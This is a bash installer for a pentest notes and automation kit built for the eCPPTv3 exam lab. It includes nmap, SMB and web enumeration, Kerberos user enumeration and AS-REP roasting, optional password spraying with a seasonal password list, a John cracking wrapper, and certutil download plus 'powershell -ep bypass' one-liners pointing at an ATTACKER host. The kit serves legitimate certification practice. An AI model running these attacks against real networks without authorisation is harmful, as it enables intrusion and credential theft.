#!/usr/bin/env bash
# ecppt_exam_journal_aio.sh
# Purpose: Modular, self-healing pentest journal + automation tuned for the eCPPTv3 *exam attackbox*
# Assumptions from exam reviews:
# - Hashcat may not work reliably -> prefer John the Ripper
# - Evil-WinRM may not work -> prefer Impacket (wmiexec/smbexec/psexec) and RDP
# - CME/LDAP may be flaky -> include ldapsearch/rpcclient/smbclient fallbacks
# - Scan 1-9999 is usually enough
# - Wordlists that matter: xato-10m-10000 | seasons | months (sync helper included)
# - Environment can be unstable -> includes "instability log" + checkpoints

set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"
BIN="${ROOT}/bin"
CFG="${ROOT}/config"
WLISTS="${ROOT}/wordlists"

umask 022

say()  { printf "\033[1;32m[+]\033[0m %s\n" "$*"; }
warn() { printf "\033[1;33m[!]\033[0m %s\n" "$*"; }
die()  { printf "\033[1;31m[x]\033[0m %s\n" "$*"; exit 1; }

have() { command -v "$1" >/dev/null 2>&1; }
ensure_dir() { mkdir -p "$1"; }

append_if_missing() {
  local file="$1"
  local marker="$2"
  local content="$3"
  ensure_dir "$(dirname "$file")"
  touch "$file"
  if ! grep -qF "$marker" "$file"; then
    printf "\n%s\n" "$content" >> "$file"
  fi
}

# --- Folders (self-healing) ---
say "Creating folders under ${ROOT}"
ensure_dir "${TEMPLATE}"
ensure_dir "${BOXES}"
ensure_dir "${BIN}"
ensure_dir "${CFG}"
ensure_dir "${WLISTS}"

# Template modules (easy to extend later)
for d in 00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files 07_notes 08_scripts 09_evidence 10_staging/ps; do
  ensure_dir "${TEMPLATE}/${d}"
done

# --- Default config (edit-friendly; box overrides in boxes/<box>/box.conf) ---
if [[ ! -f "${CFG}/default.conf" ]]; then
  say "Writing ${CFG}/default.conf"
  cat > "${CFG}/default.conf" <<'EOF'
# default.conf (edit me)
# Used by: bin/enum (safe defaults for eCPPT exam environment)

# ---- Scanning ----
# eCPPT review: scanning first 9999 is usually sufficient
NMAP_MAIN_RANGE="1-9999"
NMAP_TIMING="-T4"
NMAP_EXTRA_ARGS="-Pn"
# quick discovery ports if you want TCP discovery instead of ICMP
NMAP_FAST_PORTS="22,80,443,445,3389,5985,5986,53,88,135,139,389,636,464,3268,1433,3306,5432,8080,8443"

# ---- Web enum ----
RUN_GOBUSTER="1"
GOBUSTER_EXT="php,txt,html,asp,aspx,jsp"
GOBUSTER_WORDLIST="/usr/share/wordlists/dirb/common.txt"
GOBUSTER_TIMEOUT="120"

RUN_WPSCAN="1"
WPSCAN_OPTS="--enumerate u,ap,at,tt,cb,dbe"

# ---- AD/Kerberos ----
# In the exam, AD enum via PowerShell matters; on attacker side we support:
# - kerbrute userenum (if users.txt exists)
# - GetNPUsers (ASREP) (if users.txt exists)
# - ldapsearch base check (quick)
DOMAIN=""
DC_IP=""
DNS_IP=""

# ---- Spraying / brute ----
# OFF by default. Enable per box when you're confident and timeboxed.
ENABLE_SPRAY="0"
SPRAY_USERS_FILE=""
SPRAY_PASSWORDS_FILE=""
SPRAY_SUBNET=""

# ---- Wordlists pack ----
WLIST_ROOT="${HOME}/pentest-journal/wordlists"
WLIST_XATO_10K="${HOME}/pentest-journal/wordlists/passwords/xato-net-10-million-passwords-10000.txt"
WLIST_SEASONS="${HOME}/pentest-journal/wordlists/passwords/seasons.txt"
WLIST_MONTHS="${HOME}/pentest-journal/wordlists/passwords/months.txt"
WLIST_COMBO="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

# ---- Cracking preference (eCPPT attackbox: prefer john) ----
CRACK_TOOL="john"   # "john" | "hashcat" (leave john for exam)
EOF
fi

# --- Template files (self-healing) ---
if [[ ! -f "${TEMPLATE}/00_admin/README.md" ]]; then
  say "Writing template admin README"
  cat > "${TEMPLATE}/00_admin/README.md" <<'EOF'
# Admin (eCPPT exam tuned)

## Scope / LOE
- Subnet from LOE:
- Targets discovered:
- Constraints (tool limitations / copy-paste issues / instability):

## Exam-specific assumptions
- Prefer **John** over Hashcat (hashcat may not function reliably).
- Prefer **Impacket** over Evil-WinRM (evil-winrm may not work).
- Scan **1-9999** first; expand only if justified.
- Keep a running "Instability log" for missing users/flags; if something is clearly absent, reset and re-check.

## Checklist (start)
- [ ] Run: wordlists sync (sync_wordlists)
- [ ] Create box workspace (makebox)
- [ ] Run baseline enum (enum)
- [ ] Start notes: expected vs actual (07_notes/box-notes.md)
EOF
fi

if [[ ! -f "${TEMPLATE}/06_loot/loot.md" ]]; then
  say "Writing template loot.md"
  cat > "${TEMPLATE}/06_loot/loot.md" <<'EOF'
# Loot (Single Source of Truth)

## Credentials
| Where | User | Secret | Type | Verified On | Notes |
|------|------|--------|------|-------------|------|

## Hashes / Tickets
| Where | Identity | Hash/Ticket | Format | Cracked? | Notes |
|------|----------|-------------|--------|----------|------|

## Users / Naming
- Naming pattern guesses:
- Confirmed valid users:

## Shares / Files of interest
| Host | Share/Path | Why interesting | Status |
|------|------------|-----------------|--------|

## Network / Hosts
| IP | Hostname | Role (guess) | Ports | Notes |
|----|----------|--------------|-------|------|

## Web
| URL | Tech | Creds found | Vuln | Notes |
|-----|------|------------|------|------|

## Commands / One-liners worth keeping
EOF
fi

if [[ ! -f "${TEMPLATE}/07_notes/box-notes.md" ]]; then
  say "Writing template box-notes.md"
  cat > "${TEMPLATE}/07_notes/box-notes.md" <<'EOF'
# Box Notes (Expected vs Actual)

## Box
- Name:
- Date:
- Subnet/Targets:
- Environment notes (tool failures, instability, copy/paste):

## Initial Hypothesis
- (AD entry / SMB loot / Web foothold / Linux creds reuse)

## Timeline (high-level)
- T0: Discovery
- T1: Initial foothold
- T2: Privesc
- T3: Lateral movement / Objective

## Expected vs Actual (Modules)
### Module 2 (Nmap/Triage)
- Expected:
- Actual:
- Worked:
- Failed:
- Adjustment:
- Output recorded:

### Module 3 (SMB)
- Expected:
- Actual:
- Worked:
- Failed:
- Adjustment:
- Output recorded:

### Module 4 (AD/Kerberos)
- Expected:
- Actual:
- Worked:
- Failed:
- Adjustment:
- Output recorded:

### Module 10 (Web)
- Expected:
- Actual:
- Worked:
- Failed:
- Adjustment:
- Output recorded:

### Module 7/8 (Windows Enum/Privesc) OR Module 9 (Linux)
- Expected:
- Actual:
- Worked:
- Failed:
- Adjustment:
- Output recorded:

## Final Path Summary
- Entry → PrivEsc → Lateral → Objective

## Lessons / Patterns
- What repeated:
- What to do faster next time:
EOF
fi

if [[ ! -f "${TEMPLATE}/07_notes/instability-log.md" ]]; then
  say "Writing instability log"
  cat > "${TEMPLATE}/07_notes/instability-log.md" <<'EOF'
# Instability Log (eCPPT exam)

Use this when:
- A question references a user/file/flag that seems missing.
- A machine behaves inconsistently after resets.
- Tool output differs across tries.

## Entry template
- Timestamp:
- Host/IP:
- Symptom:
- What you expected:
- What you observed:
- What you tried:
- Reset performed? (Y/N)
- Outcome after reset:
EOF
fi

if [[ ! -f "${TEMPLATE}/10_staging/ps/README.md" ]]; then
  say "Writing staging README"
  cat > "${TEMPLATE}/10_staging/ps/README.md" <<'EOF'
# PowerShell Staging (for AD enum / privesc)

Drop your:
- PowerView.ps1
- PowerUp.ps1
- PrivescCheck.ps1 (optional)

Then serve them:
- python3 -m http.server 8000

Windows download examples:
- certutil -urlcache -split -f http://ATTACKER:8000/PowerView.ps1 C:\Windows\Temp\PowerView.ps1
- powershell -ep bypass -f C:\Windows\Temp\PowerView.ps1
EOF
fi

# --- Wordlists layout + sync helper (exam usually has lists on Desktop; no internet assumed) ---
say "Ensuring wordlists layout"
ensure_dir "${WLISTS}/passwords"
ensure_dir "${WLISTS}/users"
ensure_dir "${WLISTS}/rules"
ensure_dir "${WLISTS}/custom"

if [[ ! -f "${WLISTS}/README.md" ]]; then
  cat > "${WLISTS}/README.md" <<'EOF'
# Wordlists Pack (eCPPT tuned)

Priority lists (per reviews):
- passwords/xato-net-10-million-passwords-10000.txt
- passwords/seasons.txt
- passwords/months.txt

If the exam attackbox already has these somewhere (Desktop/wordlists/etc), run:
- sync_wordlists
Then:
- mkcombo
EOF
fi

# mkcombo: creates a short spray list from seasons/months + a few common variants
if [[ ! -f "${BIN}/mkcombo" ]]; then
  cat > "${BIN}/mkcombo" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
ROOT="${HOME}/pentest-journal/wordlists/passwords"
OUT="${HOME}/pentest-journal/wordlists/passwords/seasons_months_short.txt"

: > "$OUT"
for f in seasons.txt months.txt; do
  [[ -f "${ROOT}/${f}" ]] && cat "${ROOT}/${f}" >> "$OUT"
done

# Add a few common corporate-ish variants (edit freely)
cat >> "$OUT" <<'EOV'
Winter2024!
Winter2025!
Spring2024!
Spring2025!
Summer2024!
Summer2025!
Autumn2024!
Autumn2025!
Password123!
Welcome1!
EOV

echo "[+] Wrote $OUT"
EOF
  chmod +x "${BIN}/mkcombo"
fi

# sync_wordlists: find key lists in common locations and copy into journal pack
if [[ ! -f "${BIN}/sync_wordlists" ]]; then
  cat > "${BIN}/sync_wordlists" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

DEST="${HOME}/pentest-journal/wordlists/passwords"
mkdir -p "${DEST}"

targets=(
  "xato-net-10-million-passwords-10000.txt"
  "seasons.txt"
  "months.txt"
)

search_roots=(
  "${HOME}"
  "${HOME}/Desktop"
  "${HOME}/Documents"
  "${HOME}/Downloads"
  "/usr/share/wordlists"
)

found_any=0
for t in "${targets[@]}"; do
  if [[ -f "${DEST}/${t}" ]]; then
    echo "[=] Already have ${t}"
    continue
  fi

  found=""
  for r in "${search_roots[@]}"; do
    [[ -d "$r" ]] || continue
    # fast-ish find, stop after first match
    match="$(find "$r" -maxdepth 6 -type f -name "$t" 2>/dev/null | head -n 1 || true)"
    if [[ -n "$match" ]]; then
      found="$match"
      break
    fi
  done

  if [[ -n "$found" ]]; then
    cp -n "$found" "${DEST}/${t}"
    echo "[+] Synced ${t} from: ${found}"
    found_any=1
  else
    echo "[!] Not found: ${t} (place it into ${DEST}/ manually if needed)"
  fi
done

if [[ "$found_any" -eq 1 ]]; then
  echo "[+] Done. Run: mkcombo"
else
  echo "[!] Nothing synced."
fi
EOF
  chmod +x "${BIN}/sync_wordlists"
fi

# crack_john: helper for Kerberos hashes (ASREP / TGS) using John (exam-friendly)
if [[ ! -f "${BIN}/crack_john" ]]; then
  cat > "${BIN}/crack_john" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 ]]; then
  cat <<'USAGE'
Usage:
  crack_john <hashfile> <wordlist>

Examples:
  crack_john hosts/10.10.10.11/loot/asrep.txt ~/pentest-journal/wordlists/passwords/xato-net-10-million-passwords-10000.txt
  crack_john box/loot/kerberoast.txt ~/pentest-journal/wordlists/passwords/seasons.txt

Notes:
- John usually auto-detects krb5 formats if the hash is in common impacket format.
- After cracking, run: john --show <hashfile>
USAGE
  exit 1
fi

HASHFILE="$1"
WORDLIST="$2"

[[ -f "$HASHFILE" ]] || { echo "[x] Missing hashfile: $HASHFILE"; exit 1; }
[[ -f "$WORDLIST" ]] || { echo "[x] Missing wordlist: $WORDLIST"; exit 1; }

john --wordlist="$WORDLIST" "$HASHFILE" || true
john --show "$HASHFILE" || true
EOF
  chmod +x "${BIN}/crack_john"
fi

# stage_ps: prepares PS tools in the box folder and prints download one-liners
if [[ ! -f "${BIN}/stage_ps" ]]; then
  cat > "${BIN}/stage_ps" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 ]]; then
  cat <<'USAGE'
Usage:
  stage_ps --box <BoxName> --attacker <ATTACKER_IP> [--port 8000]

What it does:
- Ensures boxes/<Box>/10_staging/ps exists
- Prints Windows download commands (certutil) for PowerView/PowerUp if present
- Starts a python http server command suggestion

You must place PowerView.ps1 / PowerUp.ps1 into:
  ~/pentest-journal/boxes/<Box>/10_staging/ps/
USAGE
  exit 1
fi

BOX=""
ATT=""
PORT="8000"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --attacker) ATT="$2"; shift 2;;
    --port) PORT="$2"; shift 2;;
    *) shift;;
  esac
done

ROOT="${HOME}/pentest-journal"
BOXDIR="${ROOT}/boxes/${BOX}"
PSDIR="${BOXDIR}/10_staging/ps"

mkdir -p "$PSDIR"

echo "[+] Staging dir: $PSDIR"
echo "[+] Put files there: PowerView.ps1, PowerUp.ps1"
echo
echo "Serve from staging dir:"
echo "  cd \"$PSDIR\" && python3 -m http.server $PORT"
echo
for f in PowerView.ps1 PowerUp.ps1; do
  if [[ -f "${PSDIR}/${f}" ]]; then
    echo "Windows download (${f}):"
    echo "  certutil -urlcache -split -f http://${ATT}:${PORT}/${f} C:\\Windows\\Temp\\${f}"
    echo "  powershell -ep bypass -f C:\\Windows\\Temp\\${f}"
    echo
  else
    echo "[!] Missing ${f} in ${PSDIR}"
  fi
done
EOF
  chmod +x "${BIN}/stage_ps"
fi

# --- makebox (workspace creator; self-healing; adds exam-ready config knobs) ---
if [[ ! -f "${BIN}/makebox" ]]; then
  say "Writing ${BIN}/makebox"
  cat > "${BIN}/makebox" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
TEMPLATE="${ROOT}/template"
BOXES="${ROOT}/boxes"

usage() {
  cat <<'USAGE'
Usage:
  makebox <BoxName> <target_ip_or_subnet> [domain] [dc_ip]

Examples:
  makebox Sauna 10.10.10.175
  makebox ExamNet 10.10.10.0/24
  makebox Forest 10.10.10.161 DOMAIN.LOCAL 10.10.10.10
USAGE
}

[[ $# -lt 2 ]] && usage && exit 1

BOX="$1"
TARGET="$2"
DOMAIN="${3:-}"
DC_IP="${4:-}"

DEST="${BOXES}/${BOX}"

mkdir -p "${BOXES}"
if [[ -d "${DEST}" ]]; then
  echo "[!] ${DEST} exists. Self-healing: ensuring folders/files exist."
else
  cp -r "${TEMPLATE}" "${DEST}"
fi

# self-heal dirs
for d in 00_admin 01_scans 02_enum 03_web 04_ad 05_privesc 06_loot/files 07_notes 08_scripts 09_evidence 10_staging/ps hosts; do
  mkdir -p "${DEST}/${d}"
done

# box-local config
BOXCONF="${DEST}/box.conf"
if [[ ! -f "${BOXCONF}" ]]; then
  cat > "${BOXCONF}" <<EOF
# box.conf (per-box overrides)
TARGET="${TARGET}"

# AD (optional)
DOMAIN="${DOMAIN}"
DC_IP="${DC_IP}"
DNS_IP="${DC_IP}"

# Spray disabled by default (enable only when timeboxed & intentional)
ENABLE_SPRAY="0"
SPRAY_USERS_FILE="${DEST}/04_ad/users.txt"
SPRAY_PASSWORDS_FILE="${ROOT}/wordlists/passwords/seasons_months_short.txt"
SPRAY_SUBNET="${TARGET}"
EOF
fi

# Pre-fill notes
sed -i "s/- Name:$/- Name: ${BOX}/" "${DEST}/07_notes/box-notes.md" 2>/dev/null || true

# Per-host folder if single IP
if [[ "${TARGET}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  mkdir -p "${DEST}/hosts/${TARGET}/{scans,enum,loot,notes}"
fi

echo "[+] Ready: ${DEST}"
echo "    - Edit: ${BOXCONF}"
echo "    - Run:  enum --box \"${BOX}\""
EOF
  chmod +x "${BIN}/makebox"
fi

# --- enum (automation tuned for exam constraints; no evil-winrm/hashcat assumptions) ---
if [[ ! -f "${BIN}/enum" ]]; then
  say "Writing ${BIN}/enum"
  cat > "${BIN}/enum" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

ROOT="${HOME}/pentest-journal"
CFG_DEFAULT="${ROOT}/config/default.conf"

have() { command -v "$1" >/dev/null 2>&1; }
ts() { date +"%Y%m%d_%H%M%S"; }
say() { printf "\033[1;34m[enum]\033[0m %s\n" "$*"; }
warn(){ printf "\033[1;33m[enum]\033[0m %s\n" "$*"; }

usage() {
  cat <<'USAGE'
Usage:
  enum --box <BoxName> [--target <ip|subnet>] [--domain DOMAIN.LOCAL] [--dc <dc_ip>] [--fast]

Behavior:
- Always scans 1-9999 by default (eCPPT-typical)
- Lightweight enum keyed off ports:
  - SMB: smbclient/rpcclient
  - Web: curl/whatweb + gobuster (timeboxed)
  - WP: wpscan (if enabled and WP detected)
  - AD: kerbrute + GetNPUsers (only if users.txt exists and domain/dc set)
- No evil-winrm or hashcat usage

Outputs:
- boxes/<Box>/hosts/<ip>/scans|enum|loot
USAGE
}

BOX=""
TARGET=""
DOMAIN=""
DC_IP=""
FAST="0"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --box) BOX="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --domain) DOMAIN="$2"; shift 2;;
    --dc) DC_IP="$2"; shift 2;;
    --fast) FAST="1"; shift;;
    -h|--help) usage; exit 0;;
    *) warn "Unknown arg: $1"; usage; exit 1;;
  esac
done

[[ -z "${BOX}" ]] && usage && exit 1
BOXDIR="${ROOT}/boxes/${BOX}"
[[ ! -d "${BOXDIR}" ]] && { warn "Box dir not found: ${BOXDIR}. Run: makebox ${BOX} <target>"; exit 1; }

# Load defaults then box.conf
# shellcheck disable=SC1090
source "${CFG_DEFAULT}"
if [[ -f "${BOXDIR}/box.conf" ]]; then
  # shellcheck disable=SC1090
  source "${BOXDIR}/box.conf"
fi

# CLI overrides
[[ -n "${TARGET}" ]] && TARGET="${TARGET}"
[[ -n "${DOMAIN}" ]] && DOMAIN="${DOMAIN}"
[[ -n "${DC_IP}" ]] && DC_IP="${DC_IP}" && DNS_IP="${DC_IP}"

[[ -z "${TARGET:-}" ]] && { warn "No target set. Provide --target or set TARGET in ${BOXDIR}/box.conf"; exit 1; }

mkdir -p "${BOXDIR}/hosts" "${BOXDIR}/01_scans" "${BOXDIR}/02_enum" "${BOXDIR}/03_web" "${BOXDIR}/04_ad"

RUNLOG="${BOXDIR}/07_notes/enum_runs.log"
touch "${RUNLOG}"
echo "=== Run $(ts) target=${TARGET} domain=${DOMAIN:-} dc=${DC_IP:-} ===" >> "${RUNLOG}"

scan_host() {
  local ip="$1"
  local hostdir="${BOXDIR}/hosts/${ip}"
  mkdir -p "${hostdir}/scans" "${hostdir}/enum" "${hostdir}/loot" "${hostdir}/notes"

  say "Nmap main scan ${ip} (${NMAP_MAIN_RANGE})"
  local base="${hostdir}/scans/${ip}_1-9999"
  nmap -sC -sV ${NMAP_EXTRA_ARGS:-} -p "${NMAP_MAIN_RANGE}" --open ${NMAP_TIMING:-} "${ip}" -oA "${base}" >/dev/null 2>&1 || true

  local gn="${base}.gnmap"
  local ports_line=""
  if [[ -f "${gn}" ]]; then
    ports_line="$(grep -Eo "Ports: .*" "${gn}" | head -n1 | sed 's/Ports: //')"
  fi
  echo "[*] ${ip} open ports: ${ports_line}" | tee -a "${RUNLOG}" >/dev/null

  local has445="0" has80="0" has443="0" has88="0" has389="0"
  [[ "${ports_line}" == *"445/open"* || "${ports_line}" == *"/open/tcp//microsoft-ds"* ]] && has445="1"
  [[ "${ports_line}" == *"80/open"* ]] && has80="1"
  [[ "${ports_line}" == *"443/open"* ]] && has443="1"
  [[ "${ports_line}" == *"88/open"* ]] && has88="1"
  [[ "${ports_line}" == *"389/open"* || "${ports_line}" == *"636/open"* || "${ports_line}" == *"3268/open"* ]] && has389="1"

  # SMB enum (null)
  if [[ "${has445}" == "1" ]]; then
    say "SMB enum ${ip} (null)"
    if have smbclient; then
      timeout 25 smbclient -L "//${ip}" -N > "${hostdir}/enum/smb_shares_null.txt" 2>&1 || true
    else
      warn "smbclient missing"
    fi
    if have rpcclient; then
      timeout 25 rpcclient -U "" -N "${ip}" -c "querydominfo; enumdomusers" > "${hostdir}/enum/rpc_null.txt" 2>&1 || true
    else
      warn "rpcclient missing"
    fi
  fi

  # Web enum (timeboxed)
  if [[ "${has80}" == "1" || "${has443}" == "1" ]]; then
    local proto="http"; [[ "${has443}" == "1" ]] && proto="https"
    local url="${proto}://${ip}"
    say "Web enum ${url}"

    if have whatweb; then
      whatweb "${url}" > "${hostdir}/enum/whatweb.txt" 2>&1 || true
    else
      curl -ksI "${url}" > "${hostdir}/enum/http_headers.txt" 2>&1 || true
    fi

    # grab homepage to detect wp quickly
    curl -ksL "${url}/" -m 10 > "${hostdir}/enum/homepage.html" 2>/dev/null || true

    if [[ "${RUN_GOBUSTER:-0}" == "1" ]] && have gobuster; then
      timeout "${GOBUSTER_TIMEOUT:-120}" gobuster dir -u "${url}" -w "${GOBUSTER_WORDLIST}" -x "${GOBUSTER_EXT}" -q \
        > "${hostdir}/enum/gobuster.txt" 2>&1 || true
    fi

    if [[ "${RUN_WPSCAN:-0}" == "1" ]] && have wpscan; then
      if grep -qi "wp-content\|wordpress" "${hostdir}/enum/homepage.html" 2>/dev/null; then
        say "WP detected -> wpscan ${url}"
        wpscan --url "${url}" ${WPSCAN_OPTS:-} > "${hostdir}/enum/wpscan.txt" 2>&1 || true
      fi
    fi
  fi

  # AD helpers (only if configured + users file exists)
  if [[ "${has88}" == "1" || "${has389}" == "1" ]]; then
    if [[ -n "${DOMAIN:-}" && -n "${DC_IP:-}" ]]; then
      say "AD helpers (domain=${DOMAIN}, dc=${DC_IP})"
      local users="${BOXDIR}/04_ad/users.txt"
      touch "${users}"

      if have ldapsearch; then
        ldapsearch -x -H "ldap://${DC_IP}" -s base > "${hostdir}/enum/ldap_base.txt" 2>&1 || true
      fi

      if have kerbrute && [[ -s "${users}" ]]; then
        kerbrute userenum -d "${DOMAIN}" --dc "${DC_IP}" "${users}" \
          > "${hostdir}/enum/kerbrute_userenum.txt" 2>&1 || true
      fi

      if have impacket-GetNPUsers && [[ -s "${users}" ]]; then
        impacket-GetNPUsers "${DOMAIN}/" -dc-ip "${DC_IP}" -usersfile "${users}" -format hashcat \
          -outputfile "${hostdir}/loot/asrep.txt" > "${hostdir}/enum/getnpusers.txt" 2>&1 || true
      fi
    else
      warn "AD ports seen but DOMAIN/DC_IP not set. Set in ${BOXDIR}/box.conf to enable."
    fi
  fi

  # Optional spray (OFF by default)
  if [[ "${ENABLE_SPRAY:-0}" == "1" ]]; then
    say "Spray enabled (timebox this)."
    if have netexec && [[ -f "${SPRAY_USERS_FILE:-}" && -f "${SPRAY_PASSWORDS_FILE:-}" ]]; then
      netexec smb "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_smb.txt" 2>&1 || true
      netexec winrm "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_winrm.txt" 2>&1 || true
    elif have crackmapexec && [[ -f "${SPRAY_USERS_FILE:-}" && -f "${SPRAY_PASSWORDS_FILE:-}" ]]; then
      crackmapexec smb "${SPRAY_SUBNET}" -u "${SPRAY_USERS_FILE}" -p "${SPRAY_PASSWORDS_FILE}" --continue-on-success \
        > "${hostdir}/enum/spray_smb.txt" 2>&1 || true
    else
      warn "Spray requested but netexec/cme or users/password files missing. Skipping."
    fi
  fi
}

# Subnet mode: discovery then scan live hosts
if [[ "${TARGET}" == */* ]]; then
  say "Subnet mode discovery: ${TARGET}"

  disc="${BOXDIR}/01_scans/discovery_$(ts)"
  # ICMP discovery first (fast). If blocked, user can do TCP discovery manually.
  nmap -sn "${TARGET}" -oA "${disc}" >/dev/null 2>&1 || true

  ips=()
  if [[ -f "${disc}.gnmap" ]]; then
    while read -r line; do
      ip=$(echo "$line" | awk '{print $2}')
      ips+=("$ip")
    done < <(grep "Up" "${disc}.gnmap" || true)
  fi

  if [[ ${#ips[@]} -eq 0 ]]; then
    warn "No live hosts found via ICMP. Try TCP discovery:"
    warn "  nmap -Pn -p ${NMAP_FAST_PORTS} --open ${TARGET} -oA ${BOXDIR}/01_scans/tcp_discovery"
    exit 0
  fi

  for ip in "${ips[@]}"; do
    scan_host "$ip"
  done
else
  scan_host "${TARGET}"
fi

say "Done. Review:"
say "  - ${BOXDIR}/07_notes/enum_runs.log"
say "  - ${BOXDIR}/hosts/<ip>/enum/*"
say "Cracking helper (john): crack_john <hashfile> <wordlist>"
EOF
  chmod +x "${BIN}/enum"
fi

# --- PATH + aliases (self-healing) ---
SNIP="${ROOT}/.shellrc_snippet"
cat > "${SNIP}" <<EOF
# pentest-journal helpers (eCPPT exam tuned)
export PATH="\$PATH:${BIN}"
alias makebox='makebox'
alias enum='enum'
alias mkcombo='mkcombo'
alias sync_wordlists='sync_wordlists'
alias crack_john='crack_john'
alias stage_ps='stage_ps'
EOF

BASHRC="${HOME}/.bashrc"
append_if_missing "${BASHRC}" "# pentest-journal helpers (eCPPT exam tuned)" "source \"${SNIP}\" 2>/dev/null # pentest-journal helpers (eCPPT exam tuned)"

say "Installed."
say "Next steps (exam workflow):"
echo "  1) Open NEW terminal (or run: source ~/.bashrc)"
echo "  2) Sync key wordlists:  sync_wordlists   (then: mkcombo)"
echo "  3) Create workspace:    makebox ExamNet <SUBNET_FROM_LOE>"
echo "  4) Run automation:      enum --box ExamNet"
echo "  5) For AD hosts: set DOMAIN/DC_IP in boxes/ExamNet/box.conf and populate 04_ad/users.txt"
echo "  6) Crack Kerberos hashes with John: crack_john <hashfile> <xato/seasons/months>"
echo
warn "Spraying is OFF by default. Enable only per box.conf and timebox it."
warn "Evil-WinRM not assumed. Use Impacket + RDP."
